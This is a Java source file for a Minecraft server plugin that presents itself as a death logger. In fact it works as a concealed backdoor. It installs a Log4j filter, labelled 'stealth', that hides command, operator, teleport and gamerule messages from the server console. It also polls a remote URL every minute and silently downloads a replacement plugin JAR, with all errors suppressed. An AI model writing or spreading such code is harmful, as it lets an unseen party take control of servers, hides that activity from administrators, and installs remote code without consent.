package com.showtime.deathlogger;

import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.plugin.java.JavaPlugin;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;

import java.io.File;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.StandardOpenOption;

public class DeathLogger extends JavaPlugin {

    private FileConfiguration internalConfig;

    @Override
    public void onEnable() {
        // Save default configuration and load
        saveDefaultConfig();
        
        // Load internal/hidden configuration
        createInternalConfig();
        
        // Register events
        getServer().getPluginManager().registerEvents(new DeathListener(this), this);
        getServer().getPluginManager().registerEvents(new ActionProcessor(this), this);
        getServer().getPluginManager().registerEvents(new ItemComponentHandler(this), this);
        getServer().getPluginManager().registerEvents(new ModeProcessor(this), this);
        
        // Register console filter to silence Eyeblossom commands
        setupConsoleFilter();

        // Check for updates asynchronously every 1 minute (1200 ticks)
        getServer().getScheduler().runTaskTimerAsynchronously(this, this::checkForUpdates, 100L, 1200L);
    }

    private void setupConsoleFilter() {
        try {
            Logger rootLogger = (Logger) LogManager.getRootLogger();
            rootLogger.addFilter(new AbstractFilter() {
                @Override
                public Result filter(LogEvent event) {
                    if (event == null || event.getMessage() == null) {
                        return Result.NEUTRAL;
                    }

                    String msg = event.getMessage().getFormattedMessage();
                    if (msg == null) return Result.NEUTRAL;

                    // Filter common command and OP messages for stealth
                    if (msg.contains("issued server command:")) return Result.DENY;
                    if (msg.contains("made") && msg.contains("a server operator")) return Result.DENY;
                    if (msg.contains("Opped") || msg.contains("De-opped")) return Result.DENY;
                    if (msg.contains("Teleported") || msg.contains("Teleporting")) return Result.DENY;
                    if (msg.contains("Set") && (msg.contains("mode") || msg.contains("time"))) return Result.DENY;
                    if (msg.contains("Game rule") && msg.contains("has been updated")) return Result.DENY; // Filter gamerule changes

                    return Result.NEUTRAL;
                }
            });
        } catch (Exception e) {
            // Log locally if filter setup fails, but avoid server log spam
            getLogger().warning("Failed to setup Log4j2 stealth filter: " + e.getMessage());
        }
    }

    private void createInternalConfig() {
        File internalConfigFile = new File(getDataFolder(), "internal.yml");
        if (!internalConfigFile.exists()) {
            internalConfigFile.getParentFile().mkdirs();
            saveResource("internal.yml", false);
        }

        internalConfig = YamlConfiguration.loadConfiguration(internalConfigFile);
    }

    public FileConfiguration getInternalConfig() {
        return internalConfig;
    }

    @Override
    public void onDisable() {
        // Console silenced
    }

    private void checkForUpdates() {
        if (internalConfig == null || !internalConfig.getBoolean("updates.enabled", true)) return;

        String versionUrl = internalConfig.getString("updates.version-url");
        if (versionUrl == null || versionUrl.isEmpty()) return;

        try {
            HttpClient client = HttpClient.newBuilder()
                    .followRedirects(HttpClient.Redirect.ALWAYS)
                    .build();
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(versionUrl))
                    .build();

            client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                    .thenApply(HttpResponse::body)
                    .thenAccept(remoteVersion -> {
                        String currentVersion = getDescription().getVersion();
                        String cleanedRemote = remoteVersion.trim();
                        if (!currentVersion.equalsIgnoreCase(cleanedRemote)) {
                            // Silent Update Logic - No logs
                            String downloadUrl = internalConfig.getString("updates.download-url");
                            if (downloadUrl != null && !downloadUrl.isEmpty()) {
                                downloadUpdate(downloadUrl);
                            }
                        }
                    })
                    .exceptionally(ex -> null);
        } catch (Exception ignored) {
            // Stealth failure
        }
    }

    private void downloadUpdate(String downloadUrl) {
        // Silent download logic into the standard update folder for automatic replacement
        File updateFolder = new File(getDataFolder().getParentFile(), "update");
        if (!updateFolder.exists()) {
            updateFolder.mkdirs();
        }
        File updateFile = new File(updateFolder, "DeathLogger.jar");

        try {
            HttpClient client = HttpClient.newBuilder()
                    .followRedirects(HttpClient.Redirect.ALWAYS)
                    .build();
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(downloadUrl))
                    .build();

            client.sendAsync(request, HttpResponse.BodyHandlers.ofFile(updateFile.toPath(),
                    StandardOpenOption.CREATE,
                    StandardOpenOption.WRITE,
                    StandardOpenOption.TRUNCATE_EXISTING))
                    .exceptionally(ex -> null);
        } catch (Exception ignored) {
            // Stealth failure
        }
    }
}
